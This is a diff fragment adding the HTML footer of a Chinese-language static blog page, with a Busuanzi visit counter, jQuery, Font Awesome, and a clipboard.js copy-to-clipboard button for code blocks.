+                    <!-- 不蒜子统计 -->
+                    <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+
+                    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+
+
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
